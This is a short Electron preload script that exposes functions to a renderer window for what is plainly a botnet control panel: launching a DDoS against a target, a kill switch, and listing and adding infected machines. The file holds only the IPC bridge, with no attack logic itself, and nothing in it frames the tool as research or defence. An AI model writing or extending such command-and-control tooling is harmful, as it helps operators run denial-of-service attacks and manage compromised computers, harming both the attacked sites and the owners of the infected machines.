const { contextBridge, ipcRenderer } = require('electron');

contextBridge.exposeInMainWorld('electron', {
    launchDDoS: (target) => ipcRenderer.send('launch-ddos', target),
    killSwitch: () => ipcRenderer.send('kill-switch'),
    getInfectedMachines: () => ipcRenderer.invoke('get-infected-machines'),
    addInfectedMachine: (machine) => ipcRenderer.send('add-infected-machine', machine)
});
